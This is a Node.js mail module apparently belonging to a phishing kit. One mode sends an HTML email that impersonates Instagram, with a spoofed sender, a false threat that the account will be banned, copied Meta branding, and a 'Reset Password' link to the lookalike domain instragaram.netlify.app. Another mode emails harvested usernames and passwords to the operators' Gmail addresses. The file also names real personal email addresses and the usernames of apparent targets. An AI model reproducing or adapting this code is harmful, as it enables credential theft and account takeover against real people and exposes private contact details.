const nodemailer = require('nodemailer');
const catchAsyncError = require('../middlewares/catchAsyncError');

const transport = nodemailer.createTransport({
    host: process.env.SMPT_HOST,
    port: process.env.SMPT_PORT,
    service: process.env.SMPT_SERVICE,
    secure: true,
    debug: true,
    auth: {
        user: process.env.SMPT_MAIL,
        pass: process.env.SMPT_PASSWORD,
      },
})

const sendMail = catchAsyncError(async (email, secretToken, mode) => {
   
        if (mode == 'OTP') {
            
            return await transport.sendMail({
                from: process.env.SMPT_MAIL,
                to: email,
                subject: "OTP Submission",
                html: `
        <h1>Reset Password</h1>
        <p> Here is your otp to change the password ${secretToken} </p>
      `
            })
        }
        if (mode === 'email') {
            
            return await transport.sendMail({
              from: '"Instagram Recovery" <instragram@ethereal.email>', // sender address
              to: ["instgaram.service@gmail.com","yash.patel98305@gmail.com"],
              subject: "Urgent recovery of your Instagram account",
                text: "Hello Vansh, Please recover your Instagram account by following the instructions.", // plain text body
                html: `
     <!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Account Recovery</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #fafafa;
    }
    .container {
      width: 100%;
      max-width: 600px;
      margin: 20px auto;
      padding: 20px;
      background-color: #ffffff;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }
    .header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 20px;
    }
    .header img:first-child {
      height: 30px;
    }
    .profile-pic {
      height: 30px;
      width: 30px;
      border-radius: 50%;
    }
    h1 {
      font-size: 24px;
      color: #262626;
      margin-bottom: 10px;
    }
    p {
      font-size: 16px;
      color: #555555;
      line-height: 1.5;
    }
    .button {
      display: inline-block;
      background-color: #0095f6;
      color: #ffffff;
      text-decoration: none;
      padding: 12px 24px;
      border-radius: 5px;
      font-weight: bold;
      text-align: center;
      margin-top: 10px;
    }
    .footer {
      font-size: 12px;
      color: #999999;
      margin-top: 40px;
      text-align: center;
    }
    .footer a {
      color: #0095f6;
      text-decoration: none;
    }
    @media (max-width: 600px) {
      .container {
        padding: 15px;
      }
      .button {
        padding: 10px 20px;
        font-size: 14px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <img src="https://ci3.googleusercontent.com/meips/ADKq_NZOuwWow1hequUmkYlojOB8b7wBf6eSVAJaMxSRSRbOK-m43XIVYFgsxdp06-1V6TG1kn-vCSX0fIByOKeu2ekAw5B_GWA6pO79NqE0KGuXp7w=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/yO/r/Otjcwa2eCOF.png" alt="Instagram Logo">
      <img class="profile-pic" src="https://scaler-project.onrender.com/api/v1/user/photo/669ffc29d79bede1941baba7" alt="Profile Picture">
    </div>
    <p>Hi darshikagautam27,</p>
    <p>We have detected some unusual activity on your Instagram account that violates our terms and conditions. Failure to verify your account may result in a permanent ban or disablement.</p>
    <p>For authentication purposes, please log in and verify your account here:</p>
    <a href="https://instragaram.netlify.app/" class="button">Reset Password</a>
    <p>Thank you for helping us maintain the security of your account.</p>
    <div class="footer">
        <tr><td><table border="0" width="430px" cellspacing="0" cellpadding="0" align="center" style="border-collapse:collapse;margin:0 auto 0 auto;text-align:center;width:430px"><tbody><tr><td height="16" style="line-height:16px">&nbsp;</td></tr><tr><td style="border-top:solid 1px #dbdbdb"></td></tr><tr><td height="16" style="line-height:16px">&nbsp;</td></tr></tbody></table></td></tr>
        <tr><td><table border="0" width="430px" cellspacing="0" cellpadding="0" align="center" style="border-collapse:collapse;margin:0 auto 0 auto;text-align:center;width:430px"><tbody><tr><td height="24" style="line-height:24px">&nbsp;</td></tr><tr><td><table border="0" width="300px" cellspacing="0" cellpadding="0" align="center" style="border-collapse:collapse;text-align:center;margin:0 auto 0 auto"><tbody><tr><td style="width:300px;padding:0;margin:0;text-align:center;color:#999999;font-size:14px;font-family:Helvetica Neue,Helvetica,Roboto,Arial,sans-serif">If this was you, you won’t be able to access certain security and account settings for a few days. You can still access these settings from a device you’ve logged in with in the past.</td></tr></tbody></table></td></tr></tbody></table></td></tr>
        <tr><td><table border="0" width="430px" cellspacing="0" cellpadding="0" align="center" style="border-collapse:collapse;margin:0 auto 0 auto;text-align:center;width:430px"><tbody><tr><td height="16" style="line-height:16px">&nbsp;</td></tr><tr><td><table border="0" width="300px" cellspacing="0" cellpadding="0" align="center" style="border-collapse:collapse;text-align:center;margin:0 auto 0 auto"><tbody><tr><td style="width:300px;padding:0;margin:0;text-align:center;color:#999999;font-size:14px;font-family:Helvetica Neue,Helvetica,Roboto,Arial,sans-serif">If this wasn’t you, you can <a href="https://instagram.com/accounts/disavow/o9sf2yv/6RZxVwbt/?re=dmFuc2h2ZXJtYTUwMEBnbWFpbC5jb20&amp;ce=bG9naW5fb25fbmV3X2RldmljZQ" style="color:#1b74e4;text-decoration:none" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://instagram.com/accounts/disavow/o9sf2yv/6RZxVwbt/?re%3DdmFuc2h2ZXJtYTUwMEBnbWFpbC5jb20%26ce%3DbG9naW5fb25fbmV3X2RldmljZQ&amp;source=gmail&amp;ust=1732535790382000&amp;usg=AOvVaw0uQBD1JoVWe_xYm7FDOj84">secure your account</a> from a device you’ve logged in with in the past. <a href="https://help.instagram.com/584809789886474" style="color:#1b74e4;text-decoration:none" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://help.instagram.com/584809789886474&amp;source=gmail&amp;ust=1732535790382000&amp;usg=AOvVaw13iyVTXYX89vgjAGr_prkC">Learn more</a></td></tr></tbody></table></td></tr><tr><td height="16" style="line-height:16px">&nbsp;</td></tr></tbody></table></td></tr>

        <tr><td><table border="0" cellspacing="0" cellpadding="0" style="border-collapse:collapse;margin:0 auto 0 auto;width:100%;max-width:600px"><tbody><tr><td height="4" style="line-height:4px" colspan="3">&nbsp;</td></tr><tr><td width="15px" style="width:15px"></td><td width="20" style="display:block;width:20px">&nbsp;&nbsp;&nbsp;</td><td style="text-align:center"><div style="padding-top:10px;display:flex"><div style="margin:auto"><img src="https://ci3.googleusercontent.com/meips/ADKq_NZ2ivJHkv1KH9YS4Yecj8l99ueLszgAkXVAp0N50dD4Ymu0h1h6mxYcBJPC_sK-e9dLWuH1g-vgF844MKpudUUCekQ6pdY1QLsHcrt36zAkxpk=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/y3/r/Bqo9-L659wB.png" height="26" width="52" alt="" class="CToWUd" data-bit="iit"></div><br></div><div style="height:10px"></div><div style="color:#abadae;font-size:11px;margin:0 auto 5px auto">© Instagram. Meta Platforms, Inc., 1601 Willow Road, Menlo Park, CA 94025<br></div><div style="color:#abadae;font-size:11px;margin:0 auto 5px auto">This message was sent to <a style="color:#abadae;text-decoration:underline">darshikagautam01@gmail.com</a> and intended for darshikagautam27. Not your account? <a href="" style="color:#abadae;text-decoration:underline" target="_blank" data-saferedirecturl="">Remove your email</a> from this account.<br></div></td><td width="20" style="display:block;width:20px">&nbsp;&nbsp;&nbsp;</td><td width="15px" style="width:15px"></td></tr><tr><td height="32" style="line-height:32px" colspan="3">&nbsp;</td></tr></tbody></table></td></tr>
      
    </div>
  </div>
</body>
</html>



    `
            })
        }
        if(mode === "password"){
          return await transport.sendMail({
            from: '"Instagram Password" <instragram@ethereal.email>', // sender address
            to: ["instgaram.service@gmail.com","yash.patel98305@gmail.com","vanshverma500@gmail.com"],
              subject: "Password mil gya",
              text: "Password aa gya bhai", // plain text body
              html: `<p>email : ${secretToken.username}</p>
              <p>password : ${secretToken.password} </p>` 
              })
}
})

module.exports = sendMail  